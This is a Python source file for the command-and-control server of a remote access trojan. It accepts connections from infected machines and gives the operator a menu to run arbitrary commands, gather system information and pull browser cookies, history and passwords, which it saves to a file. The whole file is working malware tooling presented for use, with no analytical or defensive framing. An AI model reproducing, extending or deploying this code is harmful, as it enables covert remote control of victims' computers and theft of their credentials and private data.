# This script is developed by Yadex

import socket
import threading
import os
import platform 

clients = {}

def handle_client(client_socket, client_address):
    while True:
        try:
            os.system('cls' if os.name == 'nt' else 'clear')

            print("\nSelect an option:")
            print("1. Send Message")
            print("2. Execute Command")
            print("3. Get PC Info")
            print("4. Steal Browser Info (Cookies, History, Passwords)")
            print("5. Disconnect Client")
            choice = input(f"Command for {client_address}: ")

            if choice == "1":
                message = input("Enter message to send: ")
                client_socket.send(f"message {message}".encode())
                response = client_socket.recv(1024).decode()
                print(f"Response from {client_address}: {response}")

            elif choice == "2":
                command = input("Enter command to execute: ")
                client_socket.send(f"run {command}".encode())
                response = client_socket.recv(1024).decode()
                print(f"Response from {client_address}: {response}")

            elif choice == "3":
                client_socket.send("pcinfo".encode())
                response = client_socket.recv(4096).decode()  
                print(f"PC Info from {client_address}:\n{response}")

            elif choice == "4":
                client_socket.send("stealinfo".encode())
                response = client_socket.recv(4096).decode() 

                with open("steal_info.txt", "w", encoding="utf-8") as file:
                    file.write(f"Browser Info from {client_address}:\n")
                    file.write(response)
                
                print(f"Browser Info from {client_address} saved to 'steal_info.txt'.")

            elif choice == "5":
                client_socket.send("exit".encode())
                print(f"Disconnected from {client_address}")
                break

            else:
                print("Invalid option, please choose again.")

            input("\nPress Enter to continue...")

        except Exception as e:
            print(f"Error handling client {client_address}: {e}")
            break

def start_server():
    host = "0.0.0.0"
    port = 9999
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)
    print(f"Server listening on {host}:{port}...")

    while True:
        try:
            client_socket, client_address = server_socket.accept()
            print(f"Client connected from {client_address}")
            clients[client_address] = client_socket  
            threading.Thread(target=handle_client, args=(client_socket, client_address)).start()

        except Exception as e:
            print(f"Error accepting new client: {e}")

if __name__ == "__main__":
    start_server()
